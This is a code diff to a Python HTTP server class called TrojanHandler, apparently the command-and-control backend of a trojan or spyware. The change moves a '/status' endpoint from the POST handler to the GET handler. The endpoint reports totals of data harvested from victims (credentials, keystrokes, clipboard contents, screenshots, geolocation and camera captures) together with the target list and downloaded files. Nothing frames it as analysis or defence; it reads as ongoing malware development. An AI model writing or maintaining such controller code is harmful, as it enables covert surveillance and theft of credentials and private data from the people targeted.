@@ -98,6 +98,23 @@ class TrojanHandler(http.server.BaseHTTPRequestHandler):
             except FileNotFoundError:
                 self.send_response(404)
                 self.end_headers()
+        elif self.path == "/status":
+            # Return status of all targets
+            self.send_response(200)
+            self.send_header("Content-type", "application/json")
+            self.end_headers()
+            self.wfile.write(json.dumps({
+                "total_sessions": len(data_store["sessions"]),
+                "total_downloads": len(data_store["downloads"]),
+                "total_credentials": len(data_store["credentials"]),
+                "total_keylog": len(data_store["keylog"]),
+                "total_clipboard": len(data_store["clipboard"]),
+                "total_screens": len(data_store["screen"]),
+                "total_geolocation": len(data_store["geolocation"]),
+                "total_camera": len(data_store["camera"]),
+                "targets": data_store["targets"],
+                "downloads": data_store["downloads"]
+            }).encode())
         else:
             self.send_response(404)
             self.end_headers()
@@ -210,24 +227,6 @@ class TrojanHandler(http.server.BaseHTTPRequestHandler):
                 self.save_data()
             self.send_response(200)
             self.end_headers()
-            
-        elif self.path == "/status":
-            # Return status of all targets
-            self.send_response(200)
-            self.send_header("Content-type", "application/json")
-            self.end_headers()
-            self.wfile.write(json.dumps({
-                "total_sessions": len(data_store["sessions"]),
-                "total_downloads": len(data_store["downloads"]),
-                "total_credentials": len(data_store["credentials"]),
-                "total_keylog": len(data_store["keylog"]),
-                "total_clipboard": len(data_store["clipboard"]),
-                "total_screens": len(data_store["screen"]),
-                "total_geolocation": len(data_store["geolocation"]),
-                "total_camera": len(data_store["camera"]),
-                "targets": data_store["targets"],
-                "downloads": data_store["downloads"]
-            }).encode())
             
         else:
             self.send_response(404)
